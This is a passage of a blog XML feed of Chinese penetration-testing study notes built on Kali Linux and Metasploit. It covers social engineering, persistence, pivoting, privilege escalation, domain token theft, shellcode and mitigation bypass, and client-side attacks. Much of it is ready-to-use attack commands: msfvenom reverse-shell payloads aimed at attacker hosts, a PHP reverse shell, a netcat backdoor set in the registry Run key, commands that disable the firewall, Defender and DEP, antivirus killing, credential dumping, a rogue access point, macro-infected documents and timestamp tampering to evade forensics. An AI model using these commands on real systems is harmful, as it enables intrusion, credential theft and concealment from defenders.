      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>社会工程学</title>
      <link href="/posts/c1d45649.html"/>
      <url>/posts/c1d45649.html</url>
      
        <content type="html"><![CDATA[<h4 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h4><ul><li>SET 工具包大量依赖Metasploit</li><li>基于浏览器等客户端软件漏洞实现对客户端计算机的攻击</li></ul><a id="more"></a><h5 id="四个阶段"><a href="#四个阶段" class="headerlink" title="四个阶段"></a>四个阶段</h5><ul><li>研究：信息收集（WEB、媒体、垃圾桶、物理），确定并研究目标人</li><li>钩子：与目标建立第一次交谈（Hook、下套）</li><li>下手：与目标建立信任并获取信息</li><li>退场：不引起目标怀疑的离开攻击现场</li></ul><h5 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h5><ul><li>基于人的社工<ul><li>搭载</li><li>伪造身份</li><li>偷听、窃肩</li><li>反社工</li><li>垃圾桶工程</li></ul></li><li>基于计算机的社工<ul><li>弹出窗口</li><li>内部网络攻击</li><li>钓鱼邮件</li><li>419尼日利亚骗局</li><li>短信诈骗</li></ul></li></ul><h5 id="SET"><a href="#SET" class="headerlink" title="SET"></a>SET</h5><ul><li>站点克隆：1232</li><li>发送钓鱼邮件：112</li><li>web站点攻击向量：1212</li><li>中间文件全部存在 ~/.set目录中</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透阶段-持久后门</title>
      <link href="/posts/73d90234.html"/>
      <url>/posts/73d90234.html</url>
      
        <content type="html"><![CDATA[<h4 id="持久后门"><a href="#持久后门" class="headerlink" title="持久后门"></a>持久后门</h4><ul><li>metepreter后门<ul><li>run exploit/windows/local/persistence</li><li>run persistence -X</li></ul></li></ul><hr><h4 id="延伸用法"><a href="#延伸用法" class="headerlink" title="延伸用法"></a>延伸用法</h4><ul><li><p>Mimikatz</p></li><li><p>PHP shell</p><a id="more"></a><ul><li>msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php</li><li>把a.php放在目标机器的web页面</li><li>meterpreter &gt; use multi/handler</li><li>set payload php/meterpreter/reverse_tcp</li><li>run</li><li>当访问php页面是，就触发反弹shell</li></ul></li><li><p>Web Delivery</p><ul><li>利用代码执行漏洞访问攻击者服务器</li><li>use exploit/multi/script/web_delivery</li><li>set target 1</li><li>php -d allow_url_fopen=true -r </li></ul></li></ul><hr><h5 id="RFI远程文件包含"><a href="#RFI远程文件包含" class="headerlink" title="RFI远程文件包含"></a>RFI远程文件包含</h5><ul><li>vi /etc/php5/cgi/php.ini<ul><li>allow_url_fopen=On</li><li>allow_url_include=On</li></ul></li><li>use exploit/unix/webapp/php_include</li><li>set RHOST、</li><li>set PATH /dvwa/vulnerabilities/fi/</li><li>set PHPURI /?page=XXpathXX</li><li>set HEADERS </li></ul><hr><h4 id="Karmetasploit"><a href="#Karmetasploit" class="headerlink" title="Karmetasploit"></a>Karmetasploit</h4><ul><li><p>伪造AP、嗅探密码、截获数据、浏览器攻击</p></li><li><p>wget <a href="https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt" target="_blank" rel="noopener">https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt</a></p></li><li><p>安装其它依赖包</p><ul><li>gem install activerecord sqlite3-ruby</li></ul></li><li><p>基础架构安装配置</p><ul><li>apt-get install isc-dhcp-server</li><li>cat /etc/dhcp/dhcpd.conf<ul><li>option domain-name-server 10.0.0.1; #伪造的ap的地址</li><li>max-lease-time 72; #租约期限短，用户断网后快速恢复</li><li>authoritative#如果自己不启动授权，别人启动授权，自己的dhcp会失效</li><li>log-facility local7;</li><li>subnet 10.0.0.0 netmask 255.255.255.0{</li><li>range 10.0.0.10 10.0.0.200;</li><li>option routers 10.0.0.1;</li><li>option domain-name-servers 10.0.0.1;#子网段内的dnsServer，如果和全局不同，则可以指定。</li><li>}</li></ul></li></ul></li><li><p>伪造AP</p><ul><li><p>airmon-ng start wlan0</p></li><li><p>airbase-ng -P -C 30 -e “FREE” -v wlan0mon #</p></li><li><p>ifconfig -a</p></li><li><p>ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</p></li><li><p>dhcpd -cf /etc/dhcp/dhcpd.conf at0</p></li></ul></li><li><p>当有设备连接后</p><ul><li>msfconsole -q -r karma.rc_.txt</li><li>可以看到流量信息，但用户上不了网</li><li>gedit karma.rc_.txt<ul><li>删掉db_connect、setg、set LPORT</li><li>加上auxiliary/server/browser_autorpwn</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透阶段-跳板、POST模块</title>
      <link href="/posts/9d0c4591.html"/>
      <url>/posts/9d0c4591.html</url>
      
        <content type="html"><![CDATA[<h4 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h4><h5 id="autoroute"><a href="#autoroute" class="headerlink" title="autoroute"></a>autoroute</h5><ul><li>利用已经控制的一台计算机作为入侵内网的跳板</li><li>在其它内网计算机看来访问全部来自跳板机</li><li>run autoroute -s 2.2.2.0/24 #不能访问外网的目标网段</li><li>run autoroute -p</li><li>use auxiliary/scanner/portscan/tcp</li></ul><a id="more"></a><hr><h5 id="portfwd"><a href="#portfwd" class="headerlink" title="portfwd"></a>portfwd</h5><ul><li>利用已经被控计算机，在kali与攻击目标之间实现端口转发</li><li>portfwd add -L LIP -l LPORT  -r RIP -p RPORT</li><li>portfwd list /delete/flush</li></ul><hr><h4 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h4><ul><li>use exploit/multi/handler</li><li>set exitonsession false当建立一个session后不会退出</li><li>run -j -z</li></ul><hr><ul><li><p>meterpreter &gt; </p></li><li><p>run post/windows/gather/arp_scanner RHOSTS=192.168.43.0/24</p></li><li><p>run post/windows/gather/checkvm</p></li><li><p>run post/windows/gather/credentials/credential_collector</p></li><li><p>run post/windows/gather/enum_applications</p></li><li><p>run post/windows/gather/enum_logged_on_users</p></li><li><p>run post/windows/gather/enum_snmp</p></li><li><p>run post/multi/recon/local_exploit_suggester检查可用的本地提权漏洞模块</p></li><li><p>run post/windows/manage/delete_user USERNAME=flower</p></li><li><p>run post/multi/gather/firefox_creds 收集firefox缓存的账户密码</p></li><li><p>run post/multi/gather/ssh_creds 收集ssh身份认证信息</p></li><li><p>run post/multi/gather/check_malware REMOTEFILE=c:\\windows\\system32\\cmd.exe</p></li><li><p>run hostsedit -e 1.1.1.1 <a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> 编辑hosts文件</p></li></ul><hr><ul><li><p>自动执行meterpreter脚本</p><ul><li><p>set AutoRunScript migrate -N explorer.exe</p></li><li><p>set InitialAutoRunScript checkvm</p></li></ul></li><li><p>自动执行post模块</p><ul><li>set InitialAutoRunScript migrate -n explorer.exe</li><li>set AutoRunScript post/windows/gather/dumplinks收集最近打开的文档（首先要先切换到目标用户，migrate目标用户所在进程）</li><li>InitialAutoRunScript 先于 AutoRunScript执行</li></ul></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透阶段-嗅探、痕迹消除</title>
      <link href="/posts/5e01172b.html"/>
      <url>/posts/5e01172b.html</url>
      
        <content type="html"><![CDATA[<h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><ul><li>load sniffer</li><li>sniffer_interfaces</li><li>sniffer_start 2</li><li>sniffer_dump 2 1.cap /</li><li>在内存中缓存区块循环存储抓包，不写硬盘</li><li>智能过滤meterpreter流量，传输全程使用SSL/TLS加密</li></ul><a id="more"></a><h4 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h4><ul><li>use auxiliary/sniffer/psnuffle</li><li>set PCAPFILE 1.cap</li></ul><h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><ul><li>search -f *.ini</li><li>search -d c\\documents\ and\ settings\\administrator\desktop\ -f *.docx</li></ul><h4 id="破解弱口令密码"><a href="#破解弱口令密码" class="headerlink" title="破解弱口令密码"></a>破解弱口令密码</h4><ul><li><p>meterpreter-&gt;hashdump即可获得用户名密码，但是用下面的模块</p></li><li><p>use post/windows/gather/hashdump #system权限的meterpreter，如果是弱密码，则会直接显示密码明文</p></li></ul><h4 id="痕迹消除"><a href="#痕迹消除" class="headerlink" title="痕迹消除"></a>痕迹消除</h4><ul><li><p>文件系统访问会留下痕迹，电子取证重点关注</p></li><li><p>渗透测试和攻击者往往希望销毁文件系统访问痕迹</p></li><li><p>最好的避免被电子取证发现的方法：不要碰文件系统</p><ul><li>meterpreter的先天优势：完全基于内存</li></ul></li><li><p>MAC时间（Modified/Accessed/Changed）</p><ul><li>ls -l –time=xxxx</li><li>stat 1.txt</li><li>touch -d “2 days ago” 1.txt</li><li>touch -t 1501010101 1.txt</li></ul></li><li><p>timestomp</p><ul><li>timestomp 1.txt -t template.txt</li></ul></li><li><p>MACE：MFT entry</p><ul><li>MFT：NTFS文件系统的主文件分配表 Master File Table</li><li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li><li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建日期）</li><li>更多信息可研究 文件系统取证分析技术</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后渗透阶段-提权、后门、域渗透</title>
      <link href="/posts/cb280d7b.html"/>
      <url>/posts/cb280d7b.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>已经获得目标系统控制权后扩大战果</p><ul><li>提权</li><li>信息收集</li><li>渗透内网</li><li>永久后门</li></ul></li><li><p>基于已有session扩大战果</p><a id="more"></a><ul><li>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o 1.exe</li></ul></li></ul><hr><h4 id="关闭UAC、提权"><a href="#关闭UAC、提权" class="headerlink" title="关闭UAC、提权"></a>关闭UAC、提权</h4><ul><li>load priv</li><li>getsystem<ul><li>priv_elevate_getsystem:Operation failed:Access is denied.</li></ul></li><li>绕过UAC限制（当前session有效）<ul><li>use exploit/windows/local/ask</li><li>use exploit/windows/local/bypassuac</li><li>use exploit/windows/local/bypassuac_injection</li></ul></li><li>利用漏洞直接提权为system<ul><li>use exploit/windows/local/ms13_053_schlamperei</li><li>use exploit/windows/local/ppr_flatten_rec</li></ul></li><li>图形化界面<ul><li>set payload windows/vncinject/reverse_tcp</li><li>set viewonly no</li></ul></li><li>load priv-&gt;hashdump</li><li>psexec的pass the hash<ul><li>use exploit/windows/smb/psexec</li><li>set smbpass hash</li><li>需要提前关闭UAC（是关闭不是绕过）<ul><li>通过cmd执行注册表修改</li></ul></li></ul></li><li>关闭windows防火墙<ul><li>需要成为管理员或system权限</li><li>netsh advfirewall set allprofiles state off</li></ul></li><li>关闭windowsDefender<ul><li>net stop windefend</li><li>net stop 服务名称</li></ul></li><li>Bitlocker 磁盘加密<ul><li>manage-bde -off C:</li><li>manage-bde -status C:</li></ul></li><li>关闭DEP<ul><li>bcdedit.exe /set{current}nx AlwaysOff</li></ul></li><li>杀死防病毒软件<ul><li>killav</li><li>run post/windows/manage/killav</li></ul></li><li>开启远程桌面服务<ul><li>run /post/windows/manage/enable_rdp</li><li>run getgui -e<ul><li>run getgui -u user -p pass</li></ul></li></ul></li><li>查看远程桌面<ul><li>screenshot</li><li>use espia(load espia)-&gt;screengrab</li></ul></li></ul><hr><h4 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h4><ul><li><p>Tokens</p><ul><li>用户每次登陆，账号绑定临时的Token</li><li>访问资源时提交Token进行身份验证，类似于Web Cookie</li><li>Delegate Token：交互登录会话（本地登录和远程登录，都是活动状态）</li><li>Impersonate Token：非交互登录会话（\\192.168.0.113 访问文件共享）</li><li>Delegate Token帐号注销后变为Impersonate Token，权限依然有效</li></ul></li><li><p>Incognito</p><ul><li>独立功能的软件，被MSF集成在meterpreter中</li><li>无需密码破解或获取密码hash，窃取token将自己伪装成其他用户</li><li>尤其适用于域环境下提权渗透多操作系统</li><li>load incognito<ul><li>list_token -u</li><li>impersonate_token LAB\administrator</li><li>execute -f cmd.exe -i -t<ul><li>-t 使用当前token</li></ul></li></ul></li></ul></li></ul><hr><h4 id="通过注册表留后门"><a href="#通过注册表留后门" class="headerlink" title="通过注册表留后门"></a>通过注册表留后门</h4><ul><li><p>注册表保存着windows几乎全部配置参数</p><ul><li>如果修改不当，可直接造成系统崩溃</li><li>修改前完整备份注册表</li><li>某些注册表的修改是不可逆的</li></ul></li><li><p>常见用途</p><ul><li>修改、增加启动项</li><li>窃取存储与注册表中的机密信息</li><li>绕过文件型病毒查杀</li></ul></li><li><p>用注册表添加NC后门服务（meterpreter）</p><ul><li>upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</li><li>查看启动项：reg enumkey -k HKLM\software\microsoft\windows\currentversion\run（这个路径是四个启动项路径之一）</li><li>在其中增加一条键值：reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d “C:windows\\system32\nc.exe -Ldp 444 -e cmd.exe”</li></ul></li><li><p>添加防火墙规则</p><ul><li>execute -f cmd -i -H</li><li>netsh firewall show opmode</li><li>netsh firewall add portopening TCP 4444 “test” ENABLE ALL(注意名字换隐蔽性强的)</li><li>shutdown -r -f -t 0<ul><li>需要关闭UAC，否则Access is denied.(5)</li></ul></li><li>nc 1.1.1.1 4444<ul><li>中文乱码，shell下<code>chcp 65001</code></li></ul></li></ul></li><li><p>其它注册表项，google搜索registry quick find chart</p></li></ul><h4 id><a href="#" class="headerlink" title></a></h4>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘-静态代码分析</title>
      <link href="/posts/64feca25.html"/>
      <url>/posts/64feca25.html</url>
      
        <content type="html"><![CDATA[<h3 id="静态代码分析"><a href="#静态代码分析" class="headerlink" title="静态代码分析"></a>静态代码分析</h3><ul><li>软件源代码的主要安全检测技术</li><li>不需要构建代码运行环境，分析效率高，资源消耗低</li></ul><h5 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h5><ul><li>基于文本或标识符的匹配分析对比，以查找符合特定特征和词法规则的危险函数，API或简单语句组合。</li><li>工具：Checkmarx、ITS4</li></ul><h5 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h5><a id="more"></a><ul><li>分析软件代码中变量的取值变化和语句执行情况，来分析数据处理逻辑和程序的流控制关系，从而分析软件代码的潜在安全缺陷。</li><li>适合检查因控制流信息非法传播导致的安全问题，比如内存访问越界，常数传播等。</li><li>对于逻辑复杂的软件代码，其数据流复杂，检测准确率较低，误报率较高。</li></ul><h5 id="污点传播"><a href="#污点传播" class="headerlink" title="污点传播"></a>污点传播</h5><ul><li>分析代码中输入数据对程序执行的影响，以发现不可信的输入数据导致的程序异常执行。</li><li>需要标记要分析的输入数据</li><li>具有较高的分析准确率，然而针对大规模代码分析，由于路径数量较多，因此其分析的性能会受到较大的影响。</li><li>工具：Pixy</li></ul><h5 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h5><ul><li>在不执行程序的前提下，将程序的输入表示为符号，根据程序的执行流程和输入参数的赋值变化，把程序的输出表示成包含这些符号的逻辑或算式表达式的一种技术。通过符号执行技术获得了程序输入和输出之间关系的算数表达式，可通过约束求解的方法获得能得出正常输出结果得到输入值的范围。不能得到正常输入出的输入值，或者输入值范围的安全边界点，则是处罚程序输出异常结果的潜在输入点，也是进行安全监测的重要检测区域。</li><li>代价小、效率高。但存在路径爆炸的问题。</li></ul><h5 id="模型检验"><a href="#模型检验" class="headerlink" title="模型检验"></a>模型检验</h5><ul><li>模型检验技术首先将软件构造为状态机或者有向图等抽象模型，并使用模态、时序逻辑公式等形式化的表达来描述安全属性，然后对模型进行遍历以验证软件的这些安全属性是否满足。</li><li>可以实现全自动化，但存在状态空间爆炸的问题。</li></ul><h5 id="定理证明"><a href="#定理证明" class="headerlink" title="定理证明"></a>定理证明</h5><ul><li>是将待验证问题转化为数学上的定理证明问题，从而判断程序是否满足特定安全属性。</li><li>准确率最高，误报率较低。需要人工干预，自动化程度不高。难以用于新漏洞检测和大型程序分析。</li><li>工具：Saturn、ESC/Java</li></ul><h4 id="可执行代码检测"><a href="#可执行代码检测" class="headerlink" title="可执行代码检测"></a>可执行代码检测</h4><ul><li>对可执行代码进行反汇编后检测</li><li>分析效率低下，误报率高</li><li>分为基于程序结构的安全检测和基于程序语义的安全检测技术</li></ul><h5 id="程序结构"><a href="#程序结构" class="headerlink" title="程序结构"></a>程序结构</h5><ul><li>从二进制文件的头部，符号表以及调试信息中提取安全敏感信息</li><li>IDA Pro、Bugscam</li></ul><h5 id="程序语义"><a href="#程序语义" class="headerlink" title="程序语义"></a>程序语义</h5><ul><li>首先反汇编得到汇编代码，再将汇编代码转换为中间语言，在分析中间语言的基础上针对得到的部分语义信息进行缺陷和漏洞检测。</li><li>目前使用最为广泛的两种中间语言是二进制插桩平台Binnavi中使用的REIL，和动态插桩平台Valgrind中使用的VEX</li><li>跨平台</li><li>逆向分析的三个步骤<ul><li>（先逆向，比如用IDA）找到操作栈的关键函数，比如memcpy、strcpy等</li><li>判断栈与操作参数的大小关系，以定位是否发生了溢出漏洞</li><li>回溯函数的参数</li></ul></li></ul><h5 id="程序语义-1"><a href="#程序语义-1" class="headerlink" title="程序语义"></a>程序语义</h5><h4 id="动态安全检测"><a href="#动态安全检测" class="headerlink" title="动态安全检测"></a>动态安全检测</h4>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShellCode编写</title>
      <link href="/posts/e5ff196c.html"/>
      <url>/posts/e5ff196c.html</url>
      
        <content type="html"><![CDATA[<h4 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h4><ol><li>特殊字符需要转码。<ul><li>比如strcpy等函数造成的缓冲区溢出，会认为NULL是字符串的终结，所以shellcode中不能有null，如果有则需要变通或编码。</li></ul></li><li>函数API定位很困难。<ul><li>比如在windows系统下，系统调用多数都是封装在高级API中来调用的，而且不同的ServicePack或版本的操作系统其API都可能有所改动，所以不可能直接调用，因此需要采用动态的方法获取API地址。</li></ul></li></ol><a id="more"></a><h4 id="简单的编写shellcode的方法步骤"><a href="#简单的编写shellcode的方法步骤" class="headerlink" title="简单的编写shellcode的方法步骤"></a>简单的编写shellcode的方法步骤</h4><ol><li>用C语言书写要执行的shellcode，利用调试功能，找到其对应的汇编代码</li><li>对汇编语言进行再加工，对于push 0而言，可以通过xor ebx ebx 之后在push ebx 来实现。</li><li>在汇编第一行代码打断点，利用调试定位具体内存中的地址，找到对应地址中的机器码。</li><li>编写测试程序进行测试。</li></ol><h4 id="Windows中的防范措施"><a href="#Windows中的防范措施" class="headerlink" title="Windows中的防范措施"></a>Windows中的防范措施</h4><ul><li><p>ASLR（address space layout randomization）</p><ul><li>目的：打乱系统中的固定地址</li><li>包括：PE文件，映像地址，堆栈基址、堆地址、PEB和TEB（Thread Environment Block，线程环境块）地址。</li><li>当程序启动，将执行文件加载到内存时，操作系统通过内核模块提供的ASLR功能，在原来映像基址的基础上加上一个随机数作为新的映像基址。随机数的取值范围限定为1至254，并保证每个数值随机出现。</li></ul></li><li><p>GS Stack Protection</p><ul><li>在使用VC7.0、VS2005及后续版本编译时支持该选项。</li><li>在函数被调用时，在缓冲区和函数返回地址间增加一个32位的随机数security_cooie，在函数返回时，调用检查函数security_cookie的值是否有变化。</li><li>security_cookie在进程启动时随机产生，并且它的原始存储地址因Windows操作系统的ASLR机制也是随机存放的，攻击者无法对security_cookie进行篡改。</li></ul></li><li><p>DEP</p><ul><li>数据执行保护DEP（data execute prevention）技术可以限制内存堆栈区的代码为不可执行状态，从而防范溢出后代码的执行。</li><li>Windows操作系统中，默认情况下将包含执行代码和DLL文件的txt段，即代码段得到内存区域设置为可执行代码的内存区域，其它的内存区域不包含执行代码，不具有代码执行权限。</li><li>WindowsXP及之前的操作系统没有对这些内存区域的代码执行进行限制。</li><li>DEP分为软件DEP和硬件DEP。硬件DEP需要CPU支持，需要CPU在页表增加一个保护位NX（no execute），来控制页面是否可执行。现在的CPU一般都支持，现在的DEP一般都是硬件DEP。</li></ul></li><li><p>SafeSEH</p><ul><li>SEH(structured exception handler)是Windows异常处理机制所采用的重要数据结构链表。程序设计者可以根据自身需要，定义程序发生各种异常时相应的处理函数，保存在SEH中。</li><li>通过精心构造，攻击者通过缓冲区溢出覆盖SEH中异常处理函数句柄，将其替换为指向恶意代码的地址，并触发相应的异常，从而使程序流程转向执行恶意代码。</li><li>SafeSEH是保护Seh函数不被非法利用的技术。微软在编译器中加入了SafeSEH选项，采用该选项编译的程序将PE文件中所有合法的SEH异常处理函数的地址解析出来制成一张SEH函数表，放在PE文件的数据块中，用于异常处理时进行匹配检查。</li><li>函数表是加密的，读取时解密。</li></ul></li><li><p>SEHOP(Structed Exception Handler Overwrite Protection)</p><ul><li>检测：<ul><li>SEH结构都必须在栈上，最后一个SEH结构也必须在栈上</li><li>所有的SEH结构必须是4字节对齐的</li><li>SEH结构中异常处理函数的句柄handle（即处理函数地址）必须不在栈上</li><li>最后一个SEH结构的handle必须是（ntdll!FinalExceptionHandler）函数等</li></ul></li></ul></li></ul><h4 id="漏洞利用技术"><a href="#漏洞利用技术" class="headerlink" title="漏洞利用技术"></a>漏洞利用技术</h4><h5 id="esp跳板"><a href="#esp跳板" class="headerlink" title="esp跳板"></a>esp跳板</h5><ul><li><p>问题：</p><ul><li>有些软件的漏洞存在于某些动态链接库中，进程运行时动态加载。此外，在使用类似ASLR技术的操作系统中，地址也会因为引入的随机数每次发生变化。</li><li>此时，需要让覆盖返回地址后 新写入的返回地址能够自动定位到shellcode起始地址。</li></ul></li><li><p>解决：</p><ul><li>利用esp寄存器的特性实现，使用jmp esp作为跳板。</li><li>在函数调用结束后，被调用函数的栈帧被释放，esp寄存器中断栈顶指针指向返回地址在内存高地址方向的相邻位置。可见，通过esp寄存器，可以准确定位返回地址所在的位置。</li><li>在内存中找到一个jmp esp（跳转到esp寄存器保存的地址），将这条指令的地址覆盖返回地址。</li><li>在返回地址相邻的高地址写入shellcode代码。</li><li>move eax,exp 和 jmp eax等指令序列也可以实现。</li></ul></li></ul><h5 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h5><ul><li><p>有些漏洞，不支持或者不能实现精确定位shellcode。且堆分配地址随机性比较大。</p></li><li><p>对喷洒是在shellcode前面加上大量的滑板指令（slide code），组成一个非常长的注入代码段。然后向系统申请大量内存，并且反复用这个注入代码段来填充。这样就使得内存空间被大量的注入代码所占据。攻击者再结合漏洞利用技术，只要使程序跳转到堆中被填充了注入代码的任何一个地址，程序指令就会顺着滑板指令最终执行到shellcode代码。</p></li><li><p>滑板指令一般是NOP(no-operation)0x90</p></li><li><p>随着一些新的攻击技术出现，滑板指令除了利用NOP指令填充外，也逐渐开始使用更多的类NOP指令，譬如0x0C，0x0D(回车、换行)等。</p></li><li><p>对喷洒用于针对浏览器漏洞的攻击较多，尤其是网页木马应用较多，这些漏洞利用程序通常会将EIP指向堆区的0x0C0C0C0C地址，然后使用Javascript脚本申请大量堆内存，在内存空间中填充大量包含0x和shellcode的注入代码。漏洞利用程序从低地址向高地址一直申请超过200MB的堆内存空间，由于200M对应的内存地址为0x0C800000,高于EIP指向的0x0C0C0C0C,因而申请的堆空间超过200MB时将覆盖0x0C0C0C0C,只要注入代码中的0x90能覆盖0x0C0C0C0C，就可以成功。</p></li><li><p>占用内存大，容易被察觉。</p></li><li><p>一般配合堆栈溢出攻击，不能用于主动攻击，也不能保证成功。</p></li><li><p>对于windows系统比较好的系统防范方法是开启DEP功能，即使被绕过，被利用的概率也会大大降低。</p></li></ul><h5 id="DEP绕过"><a href="#DEP绕过" class="headerlink" title="DEP绕过"></a>DEP绕过</h5><ul><li><p>基本思想：</p><ul><li>ROP（return-oriented programing）攻击者从已有的库或可执行文件中提取指令片段，构建恶意代码。ROP允许我们绕过DEP和ALSR，但不能绕开GS缓冲区溢出的检测防护技术。</li><li>借助已经存在的代码块（也叫配件），这些配件来自程序已经加载的模块。我们可以在已经加载的模块中找到一些以retn结尾的配件，把这些配件的地址布置在堆栈上，当控制EIP并返回的时候，程序就会跳去执行这些配件，而这些配件是在别的模块代码段，不受DEP影响。</li><li>retn的操作是 pop eip，然后执行eip指向的指令。</li></ul></li><li><ol><li>ROP通过ROP链（retn）实现有序的汇编指令执行</li><li>ROP链由一个个ROP小配件组成</li><li>ROP小配件由目的执行指令+return组成</li></ol></li><li><p>未启用ASLR的小配件有很多</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-扫描器和客户端渗透</title>
      <link href="/posts/2029f11.html"/>
      <url>/posts/2029f11.html</url>
      
        <content type="html"><![CDATA[<h4 id="扫描器扫描"><a href="#扫描器扫描" class="headerlink" title="扫描器扫描"></a>扫描器扫描</h4><h5 id="Openvas（GVM）"><a href="#Openvas（GVM）" class="headerlink" title="Openvas（GVM）"></a>Openvas（GVM）</h5><ul><li><p>Load openvas</p><ul><li>命令行模式，需要配置，使用繁琐</li></ul></li><li><p>直接在opevas扫描，向msf导入nbe格式扫描日志</p><ul><li>db_import openvas.nbe</li></ul></li></ul><a id="more"></a><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><ul><li>也是nbe格式</li><li><h2 id="直接调用nessus"><a href="#直接调用nessus" class="headerlink" title="直接调用nessus"></a>直接调用nessus</h2></li></ul><h5 id="Nextpose"><a href="#Nextpose" class="headerlink" title="Nextpose"></a>Nextpose</h5><ul><li>xml格式</li></ul><h4 id="客户端渗透"><a href="#客户端渗透" class="headerlink" title="客户端渗透"></a>客户端渗透</h4><ul><li>在无法突破网路边界的情况下转而攻击客户端<ul><li>社会工程学攻击</li><li>进而渗透线上业务网络</li></ul></li><li>含有漏洞利用代码的WEB站点<ul><li>利用客户端漏洞</li></ul></li><li>含有漏洞利用代码的DOC、PDF等文档</li><li>诱骗被害者执行Payload</li></ul><hr><h5 id="打包payload进deb安装包"><a href="#打包payload进deb安装包" class="headerlink" title="打包payload进deb安装包"></a>打包payload进deb安装包</h5><ul><li>先用msfvenom生成pyaload</li><li>use exploit/multi/handler</li><li>set payload windows/shell/reverse_tcp</li><li>set LHOST xxx;set LPORT xxx;</li><li>exploit(侦听端口)</li><li>想办法让payload执行</li><li>Linux下可以把payload打包进deb，然后诱使目标执行。</li></ul><hr><h5 id="其它方式"><a href="#其它方式" class="headerlink" title="其它方式"></a>其它方式</h5><ul><li>利用Acrobat Reader漏洞执行payload</li><li>构造PDF文件：exploit/widows/fileformat/adobe_utilprintf</li><li>构造恶意网站：exploit/windows/browser/adobe_utilprintf</li><li>IE浏览器漏洞：search ms14_064</li><li>JRE漏洞：search java_jre</li><li>flash漏洞：exploit/multi/browser/adobe_flash_hacking_team_uaf</li><li>生成Android后门程序<ul><li>use payload/android/meterpreter/reverse_tcp</li><li>generate -f a.apk -p android -t raw</li></ul></li><li>VBScript感染方式<ul><li>利用宏感染word、excel</li><li>绕过某些基于文件类型检查的安全机制</li><li>生成vbscript脚本：<ul><li>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.43.125 LPORT=4444 -e x86/shikata_ga_nai -f vba.exe</li><li>在word把payload第一部分VBA代码保存成宏，随便起个名字</li><li>payload第二部分粘贴入word文档正文</li></ul></li></ul></li><li>Meterpreter<ul><li>use priv</li><li>run post/windows/capture/keylog_recorder</li></ul></li><li>search browser_autopwn</li></ul><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><p>apt-get install 下载目录/var/cache/apt/archives</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF-弱点扫描</title>
      <link href="/posts/8d87f863.html"/>
      <url>/posts/8d87f863.html</url>
      
